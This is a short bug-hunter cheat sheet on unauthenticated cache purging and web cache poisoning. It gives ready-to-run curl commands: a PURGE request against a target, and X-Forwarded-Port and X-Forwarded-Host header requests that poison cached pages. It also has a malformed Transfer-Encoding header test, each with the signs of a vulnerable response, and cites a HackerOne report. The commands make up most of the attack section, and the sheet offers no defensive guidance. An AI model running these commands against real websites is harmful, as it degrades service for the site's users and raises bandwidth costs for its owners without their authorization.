#  Unauth Cache Purging
## What is Cache Purge Request?
Cache Purge means to delete the stored caches. So if you purge the cache, it means the next time you visit that website, it will generate the page by pulling info from the database (the original method). Then, it will recopy the page again to create a new cache.

The Cache Purge request, simply allows users to delete any cached resource.

# Unauthenticated Cache Purge
Description: If the Purge request is available to any user, even those who are not authenticated, they can delete/invalidate the caches stored at certain resource. This can lead to increased bandwidth costs and degraded application performance. Allowing anonymous users to purge cache could be used to maliciously degrade performance.
How to Perform: Simply give the curl command:
```bash
curl -X PURGE https://target.com
```
If it is vulnerable it will look like this:
{Status ok and all in response}

if its not then it will look like this:
provided credentials are mission or invalid

[Report/Reference](https://hackerone.com/reports/154278)

## DOS Via Cache
```bash
curl -H ‘X-Forwarded-Port: 123’ https://www.website.com/?toxic=888
Then try to load https://www.website.com/?toxic=888 in your browser
```
```bash
curl -H ‘X-Forwarded-Host: www.website.com:123' https://www.website.com/?toxic=888
Then try to load https://www.website.com/?toxic=888 in your browser
```
```bash
- Go to target website and intercept the request using burp suite
Send the request to repeater and add the header zTRANSFER-ENCODING: dgsht
Click on go and check the response, if it is vulnerable then it will show you an error of 501 ‘NOT_IMPLEMENTED’

```
